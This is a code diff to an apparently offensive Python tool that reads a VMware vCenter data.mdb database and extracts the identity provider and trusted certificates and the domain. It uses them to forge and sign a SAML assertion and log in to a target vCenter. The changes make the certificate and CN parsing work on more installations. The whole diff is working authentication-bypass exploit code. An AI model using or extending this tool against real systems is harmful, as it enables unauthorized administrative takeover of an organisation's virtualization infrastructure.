@@ -4,6 +4,7 @@ import base64
 import bitstring
 import sys
 import zlib
+from string import printable
 from urllib.parse import parse_qs, quote, unquote, urlparse
 
 import socket
@@ -137,30 +138,40 @@ def get_idp_cert(stream, verbose=False):
         sys.exit()
 
 
+def get_domain_from_cn(cn):
+    parts = cn.split(',')
+    domain_parts = [ part.lstrip('dc=').lstrip('DC=').strip() for part in parts if 'dc=' in part.lower() ]
+    domain = '.'.join(domain_parts).strip()
+    domain = ''.join(char for char in domain if char in printable)
+    return domain
+
+
 def get_trusted_cert1(stream, verbose=False):
-    matches = stream.findall(trusted_cert1_flag)
+    tup = stream.findall(trusted_cert1_flag)
+    matches = list(tup)
     if matches:
         for match in matches:
-            stream.read('bytes:50')
+            stream.pos = match
             if verbose:
                 print(f'[!] Looking for cert 1 at position: {match}')
-        
-            domain_begin = stream.readto('0x636e3d', bytealigned=True)
-            domain_begin_pos = stream.pos
-            if verbose:
-                print(f'[!] Domain begin position: {domain_begin_pos}')
 
-            domain_end = stream.readto('0x2c')
-            domain_end_pos = stream.pos
+            cn_end = stream.readto('0x000013', bytealigned=True)
+            cn_end_pos = stream.pos
             if verbose:
-                print(f'[!] Domain end position: {domain_end_pos}')
+                print(f'[!] CN end position: {cn_end_pos}')
 
-            stream.pos = domain_begin_pos
-            domain_len = int((domain_end_pos - domain_begin_pos - 8) / 8)
-            domain = stream.read(f'bytes:{domain_len}').decode()
-            cn = stream.read(f'bytes:{76 + domain_len}')
-            if verbose:
-                print(f'[!] Domain: {domain}')
+            stream.pos = match
+            cn_len = int((cn_end_pos - match - 8) / 8)
+            cn = stream.read(f'bytes:{cn_len}').decode()
+            domain = get_domain_from_cn(cn)
+            if domain:
+                print(f'[*] CN: {cn}')
+                print(f'[*] Domain: {domain}')
+            else:
+                print(f'[!] Failed parsing domain from CN')
+                sys.exit()
+
+            cn = stream.readto(f'0x0002', bytealigned=True)
 
             # Get TrustedCertificate1 pem 1
             cert1_size_hex = stream.read('bytes:2')
@@ -169,9 +180,9 @@ def get_trusted_cert1(stream, verbose=False):
             if verbose:
                 print(f'[!] Cert 1 size: {cert1_size}')
 
-            if b'VMware Engineering' not in cert1_bytes:
+            if b'ssoserverSign' not in cert1_bytes:
                 if verbose:
-                    print('[!] Cert does not contain VMware Engineering - keep looking')
+                    print('[!] Cert does not contain ssoserverSign - keep looking')
                 continue
       
             cert1 = writepem(cert1_bytes, verbose)
@@ -186,14 +197,28 @@ def get_trusted_cert1(stream, verbose=False):
 
 def get_trusted_cert2(stream, verbose=False):
     # Get TrustedCertificate1 pem2
-    matches = stream.findall(trusted_cert2_flag)
+    tup = stream.findall(trusted_cert2_flag)
+    matches = list(tup)
     for match in matches:
         stream.pos = match - 10240
-        start = stream.readto('0x308204', bytealigned=True)
-        stream.pos = stream.pos - 40 
+
+        try:
+            start = stream.readto('0x308204', bytealigned=True)
+        except:
+            print('Failed finding cert 2 with flag 1, looking for flag 2...')
+            try:
+                start = stream.readto('0x308203', bytealigned=True)
+            except:
+                print('Failed finding cert 2')
+                sys.exit()
+
+        stream.pos = stream.pos - 40
         cert2_size_hex = stream.read('bytes:2')
         cert2_size = int(cert2_size_hex.hex(), 16)
         cert2_bytes = stream.read(f'bytes:{cert2_size}')
+        if verbose:
+            print(f'Cert 2 Size: {cert2_size}')
+
         cert2 = writepem(cert2_bytes, verbose)
         if not check_key_valid(cert2):
             continue
@@ -202,6 +227,7 @@ def get_trusted_cert2(stream, verbose=False):
         return cert2
 
     print(f'[-] Failed to find the trusted cert 2')
+    sys.exit()
 
 def saml_request(vcenter):
     """Get SAML AuthnRequest from vCenter web UI"""
@@ -276,6 +302,7 @@ def login(vcenter, saml_resp):
         print('[-] Failed logging in with SAML request')
         raise
 
+
 def get_hostname(vcenter):
     try:
         print('[*] Obtaining hostname from vCenter SSL certificate')
@@ -297,6 +324,7 @@ def get_hostname(vcenter):
         print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
         raise
 
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-p', '--path', help='The path to the data.mdb file', required=True)
@@ -314,6 +342,6 @@ if __name__ == '__main__':
     # Generate SAML request
     hostname = get_hostname(args.target)
     req = saml_request(args.target)
-    t = fill_template(hostname, args.target, domain, req)
+    t = fill_template(hostname, args.target, domain,req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
     c = login(args.target, s)
